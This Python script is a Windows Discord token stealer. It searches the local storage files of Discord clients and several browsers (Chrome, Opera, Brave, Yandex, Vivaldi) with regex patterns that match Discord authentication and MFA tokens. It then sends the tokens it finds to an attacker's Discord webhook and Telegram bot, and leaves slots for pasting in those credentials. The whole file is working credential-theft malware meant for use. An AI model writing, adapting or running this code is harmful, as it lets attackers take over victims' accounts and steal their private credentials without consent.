
#for send to discord
PASTE_WEBHOOK_URL = 'PASTE_WEBHOOK_URL'

#for send to telegram
PASTE_BOT_TOKEN = ''
PASTE_U_CHAT_ID = '' 

import os
if os.name != "nt": exit()
import json
import re

#for send tokens to telegram
import telegram
#for send tokens to discord
from urllib.request import Request, urlopen


def GetTokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord' ,
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Brave" : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = []
        for file_name in os.listdir(path + ldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        if len(tokens) > 0:
            grabbed[platform] = tokens
    return grabbed 

def SendTokensEmbed(send_settings : dict, grabbed : dict = None):
    """
    how use
    send_settings = {'discord' : 'webhook'} -> send tokens to discord
    send_settings = {'telegran' : ['bot-token', 'chat-id']} -> 1 element - tokens, 2 - chat-id. send tokens to telegram.
    send_settings = {'telegran' : ['bot-token', 'chat-id'], 'discord' : 'webhook'} -> send tokens to telegram and discord
    """
    if not grabbed: grabbed = GetTokens()
    data = {}
    data['discord'] = [{'description' : ''}]
    data['telegram'] = ''

    #generate message
    for app in list(grabbed.keys()):
        data['discord'][0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(grabbed[app]) + '\n```'
        data['telegram'] += f'\n[Grabbed From {app}]\n'+ '\n\n'.join(grabbed[app]) + '\n'
    #send message   
    if 'discord' in list(send_settings.keys()):
        urlopen(Request(send_settings['discord'], data=json.dumps({"embeds" : data['discord']}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
    if 'telegram' in list(send_settings.keys()):
        if len(send_settings['telegram']) == 2:
            bot_token = send_settings['telegram'][0]
            user_id = send_settings['telegram'][1]
            sendMessage_telegramBot(bot_token, user_id, data['telegram'])

    return data


def sendMessage_telegramBot (bot_token, user_id, message):
    try:
        request = telegram.utils.request.Request(read_timeout=10)
        bot = telegram.Bot(bot_token, request=request)
        bot.send_message(chat_id=user_id, text=message)
    except:
        pass

if __name__ == "__main__":
    SendTokensEmbed({'discord' : PASTE_WEBHOOK_URL, 'telegram' : [PASTE_BOT_TOKEN, PASTE_U_CHAT_ID]})
